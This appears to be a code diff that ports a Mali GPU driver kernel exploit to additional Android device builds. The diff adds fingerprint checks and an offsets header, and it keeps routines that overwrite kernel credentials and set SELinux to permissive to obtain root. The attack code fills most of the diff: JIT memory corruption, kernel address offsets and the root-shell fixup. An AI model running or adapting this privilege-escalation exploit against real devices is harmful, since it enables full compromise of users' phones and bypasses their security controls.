@@ -1,6 +1,7 @@
 #include <err.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,11 +9,11 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <unistd.h>
-#include "stdbool.h"
 #include <sys/system_properties.h>
 #include <sys/syscall.h>
 #include <pthread.h>
 
+#include "offsets.h"
 #include "mali.h"
 #include "mali_base_jm_kernel.h"
 #include "midgard.h"
@@ -37,7 +38,7 @@
 
 #define POOL_SIZE 16384
 
-#define RESERVED_SIZE 32
+#define RESERVED_SIZE 12
 
 #define TOTAL_RESERVED_SIZE 1024
 
@@ -51,7 +52,7 @@
 
 #define JIT_GROUP_ID 1
 
-#define KERNEL_BASE 0x80000000
+#define KERNEL_BASE 0x40008000
 
 #define OVERWRITE_INDEX 256
 
@@ -63,45 +64,9 @@
 
 #define ADD_COMMIT_INDEX 3
 
-#define AVC_DENY_2211 0x8d6810
+static uint64_t sel_read_enforce;
 
-#define SEL_READ_ENFORCE_2211 0x8ea124
-
-#define INIT_CRED_2211 0x2fd1388
-
-#define COMMIT_CREDS_2211 0x17ada4
-
-#define ADD_INIT_2211 0x910e2000 //add x0, x0, #0x388
-
-#define ADD_COMMIT_2211 0x91369108 //add x8, x8, #0xda4
-
-#define AVC_DENY_2212 0x8ba710
-
-#define SEL_READ_ENFORCE_2212 0x8cdfd4
-
-#define INIT_CRED_2212 0x2fd1418
-
-#define COMMIT_CREDS_2212 0x177ee4
-
-#define ADD_INIT_2212 0x91106000 //add x0, x0, #0x418
-
-#define ADD_COMMIT_2212 0x913b9108 //add x8, x8, #0xee4
-
-#define AVC_DENY_2301 0x8ba710
-
-#define SEL_READ_ENFORCE_2301 0x8cdfd4
-
-#define INIT_CRED_2301 0x2fd1418
-
-#define COMMIT_CREDS_2301 0x177ee4
-
-#define ADD_INIT_2301 0x91106000 //add x0, x0, #0x418
-
-#define ADD_COMMIT_2301 0x913b9108 //add x8, x8, #0xee4
-
-static uint64_t sel_read_enforce = SEL_READ_ENFORCE_2301;
-
-static uint64_t avc_deny = AVC_DENY_2301;
+static uint64_t avc_deny;
 
 /*
 Overwriting SELinux to permissive
@@ -183,7 +148,7 @@ void jit_init(int fd, uint64_t va_pages, uint64_t trim_level, int group_id) {
 uint64_t jit_allocate(int fd, uint8_t atom_number, uint8_t id, uint64_t va_pages, uint64_t commit_pages, uint8_t bin_id, uint16_t usage_id, uint64_t gpu_alloc_addr) {
   struct base_jit_alloc_info info = {0};
   struct base_jd_atom_v2 atom = {0};
-  
+
   info.id = id;
   info.gpu_alloc_addr = gpu_alloc_addr;
   info.va_pages = va_pages;
@@ -203,7 +168,7 @@ uint64_t jit_allocate(int fd, uint8_t atom_number, uint8_t id, uint64_t va_pages
   if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
     err(1, "submit job failed\n");
   }
-  return *((uint64_t*)gpu_alloc_addr); 
+  return *((uint64_t*)gpu_alloc_addr);
 }
 
 void jit_free(int fd, uint8_t atom_number, uint8_t id) {
@@ -222,7 +187,7 @@ void jit_free(int fd, uint8_t atom_number, uint8_t id) {
   if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
     err(1, "submit job failed\n");
   }
-    
+
 }
 
 void mem_flags_change(int fd, uint64_t gpu_addr, uint32_t flags, int ignore_results) {
@@ -402,7 +367,7 @@ void write_to(int mali_fd, uint64_t gpu_addr, uint64_t value, int atom_number, e
   struct MALI_JOB_HEADER jh = {0};
   jh.is_64b = true;
   jh.type = MALI_JOB_TYPE_WRITE_VALUE;
-  
+
   struct MALI_WRITE_VALUE_JOB_PAYLOAD payload = {0};
   payload.type = type;
   payload.immediate_value = value;
@@ -461,24 +426,105 @@ void select_offset() {
   char fingerprint[256];
   int len = __system_property_get("ro.build.fingerprint", fingerprint);
   LOG("fingerprint: %s\n", fingerprint);
-  if (!strcmp(fingerprint, "google/oriole/oriole:13/TP1A.221105.002/9080065:user/release-keys")) {
-    avc_deny = AVC_DENY_2211;
-    sel_read_enforce = SEL_READ_ENFORCE_2211;
-    fixup_root_shell(INIT_CRED_2211, COMMIT_CREDS_2211, SEL_READ_ENFORCE_2211, ADD_INIT_2211, ADD_COMMIT_2211);
+
+  if(!strcmp(fingerprint, CTX_00_04_000)) {
+    avc_deny = AVC_DENY_CTX_00_04_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTX_00_04_000;
+    fixup_root_shell(INIT_CRED_CTX_00_04_000, COMMIT_CREDS_CTX_00_04_000, SEL_READ_ENFORCE_CTX_00_04_000, ADD_INIT_CTX_00_04_000, ADD_COMMIT_CTX_00_04_000);
     return;
   }
-  if (!strcmp(fingerprint, "google/oriole/oriole:13/TQ1A.221205.011/9244662:user/release-keys")) {
-    avc_deny = AVC_DENY_2212;
-    sel_read_enforce = SEL_READ_ENFORCE_2212;
-    fixup_root_shell(INIT_CRED_2212, COMMIT_CREDS_2212, SEL_READ_ENFORCE_2212, ADD_INIT_2212, ADD_COMMIT_2212);
+
+  if(!strcmp(fingerprint, CTX_00_05_000)) {
+    avc_deny = AVC_DENY_CTX_00_05_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTX_00_05_000;
+    fixup_root_shell(INIT_CRED_CTX_00_05_000, COMMIT_CREDS_CTX_00_05_000, SEL_READ_ENFORCE_CTX_00_05_000, ADD_INIT_CTX_00_05_000, ADD_COMMIT_CTX_00_05_000);
     return;
   }
-  if (!strcmp(fingerprint, "google/oriole/oriole:13/TQ1A.230105.002/9325679:user/release-keys")) {
-    avc_deny = AVC_DENY_2301;
-    sel_read_enforce = SEL_READ_ENFORCE_2301;
-    fixup_root_shell(INIT_CRED_2301, COMMIT_CREDS_2301, SEL_READ_ENFORCE_2301, ADD_INIT_2301, ADD_COMMIT_2301);
+
+  if(!strcmp(fingerprint, CTX_00_08_000)) {
+    avc_deny = AVC_DENY_CTX_00_08_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTX_00_08_000;
+    fixup_root_shell(INIT_CRED_CTX_00_08_000, COMMIT_CREDS_CTX_00_08_000, SEL_READ_ENFORCE_CTX_00_08_000, ADD_INIT_CTX_00_08_000, ADD_COMMIT_CTX_00_08_000);
     return;
   }
+
+  if(!strcmp(fingerprint, CTX_00_09_000)) {
+    avc_deny = AVC_DENY_CTX_00_09_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTX_00_09_000;
+    fixup_root_shell(INIT_CRED_CTX_00_09_000, COMMIT_CREDS_CTX_00_09_000, SEL_READ_ENFORCE_CTX_00_09_000, ADD_INIT_CTX_00_09_000, ADD_COMMIT_CTX_00_09_000);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTX_01_00_000)) {
+    avc_deny = AVC_DENY_CTX_01_00_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTX_01_00_000;
+    fixup_root_shell(INIT_CRED_CTX_01_00_000, COMMIT_CREDS_CTX_01_00_000, SEL_READ_ENFORCE_CTX_01_00_000, ADD_INIT_CTX_01_00_000, ADD_COMMIT_CTX_01_00_000);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTX_01_01_001)) {
+    avc_deny = AVC_DENY_CTX_01_01_001;
+    sel_read_enforce = SEL_READ_ENFORCE_CTX_01_01_001;
+    fixup_root_shell(INIT_CRED_CTX_01_01_001, COMMIT_CREDS_CTX_01_01_001, SEL_READ_ENFORCE_CTX_01_01_001, ADD_INIT_CTX_01_01_001, ADD_COMMIT_CTX_01_01_001);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTX_01_04_000)) {
+    avc_deny = AVC_DENY_CTX_01_04_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTX_01_04_000;
+    fixup_root_shell(INIT_CRED_CTX_01_04_000, COMMIT_CREDS_CTX_01_04_000, SEL_READ_ENFORCE_CTX_01_04_000, ADD_INIT_CTX_01_04_000, ADD_COMMIT_CTX_01_04_000);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTX_01_11_000)) {
+    avc_deny = AVC_DENY_CTX_01_11_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTX_01_11_000;
+    fixup_root_shell(INIT_CRED_CTX_01_11_000, COMMIT_CREDS_CTX_01_11_000, SEL_READ_ENFORCE_CTX_01_11_000, ADD_INIT_CTX_01_11_000, ADD_COMMIT_CTX_01_11_000);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTZ_00_03_000)) {
+    avc_deny = AVC_DENY_CTZ_00_03_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTZ_00_03_000;
+    fixup_root_shell(INIT_CRED_CTZ_00_03_000, COMMIT_CREDS_CTZ_00_03_000, SEL_READ_ENFORCE_CTZ_00_03_000, ADD_INIT_CTZ_00_03_000, ADD_COMMIT_CTZ_00_03_000);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTZ_01_00_000)) {
+    avc_deny = AVC_DENY_CTZ_01_00_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_00_000;
+    fixup_root_shell(INIT_CRED_CTZ_01_00_000, COMMIT_CREDS_CTZ_01_00_000, SEL_READ_ENFORCE_CTZ_01_00_000, ADD_INIT_CTZ_01_00_000, ADD_COMMIT_CTZ_01_00_000);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTZ_01_01_000)) {
+    avc_deny = AVC_DENY_CTZ_01_01_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_01_000;
+    fixup_root_shell(INIT_CRED_CTZ_01_01_000, COMMIT_CREDS_CTZ_01_01_000, SEL_READ_ENFORCE_CTZ_01_01_000, ADD_INIT_CTZ_01_01_000, ADD_COMMIT_CTZ_01_01_000);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTZ_01_02_004)) {
+    avc_deny = AVC_DENY_CTZ_01_02_004;
+    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_02_004;
+    fixup_root_shell(INIT_CRED_CTZ_01_02_004, COMMIT_CREDS_CTZ_01_02_004, SEL_READ_ENFORCE_CTZ_01_02_004, ADD_INIT_CTZ_01_02_004, ADD_COMMIT_CTZ_01_02_004);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTZ_01_02_005)) {
+    avc_deny = AVC_DENY_CTZ_01_02_005;
+    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_02_005;
+    fixup_root_shell(INIT_CRED_CTZ_01_02_005, COMMIT_CREDS_CTZ_01_02_005, SEL_READ_ENFORCE_CTZ_01_02_005, ADD_INIT_CTZ_01_02_005, ADD_COMMIT_CTZ_01_02_005);
+    return;
+  }
+
+  if(!strcmp(fingerprint, CTZ_01_03_000)) {
+    avc_deny = AVC_DENY_CTZ_01_03_000;
+    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_03_000;
+    fixup_root_shell(INIT_CRED_CTZ_01_03_000, COMMIT_CREDS_CTZ_01_03_000, SEL_READ_ENFORCE_CTZ_01_03_000, ADD_INIT_CTZ_01_03_000, ADD_COMMIT_CTZ_01_03_000);
+    return;
+  }
+
   err(1, "unable to match build id\n");
 }
 
@@ -548,12 +594,12 @@ int trigger(int mali_fd2) {
   g_ready_commit = false;
   commit_failed = false;
   atom_number = 1;
-  void* gpu_alloc_addr = map_gpu(mali_fd, 1, 1, false, 0);  
+  void* gpu_alloc_addr = map_gpu(mali_fd, 1, 1, false, 0);
   uint64_t first_jit_id = 1;
   uint64_t second_jit_id = 2;
 
   uint64_t jit_addr = jit_allocate(mali_fd, increase_atom_number(), first_jit_id, FREED_NUM, 0, 0, 0, (uint64_t)gpu_alloc_addr);
-  uint64_t jit_addr2 = jit_allocate(mali_fd, increase_atom_number(), second_jit_id, POOL_SIZE * 2, 512 - FREED_NUM, 1, 1, (uint64_t)gpu_alloc_addr); 
+  uint64_t jit_addr2 = jit_allocate(mali_fd, increase_atom_number(), second_jit_id, POOL_SIZE * 2, 512 - FREED_NUM, 1, 1, (uint64_t)gpu_alloc_addr);
 
   if (jit_addr % (512 * 0x1000) != 0 || jit_addr2 < jit_addr || jit_addr2 - jit_addr != FREED_NUM * 0x1000) {
     LOG("incorrect memory layout\n");
@@ -632,7 +678,7 @@ int main() {
   reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
   map_gpu(mali_fd2, 1, 1, false, 0);
   if (!trigger(mali_fd2)) {
-    system("sh");
+    system("getenforce");
   }
 }
 #else
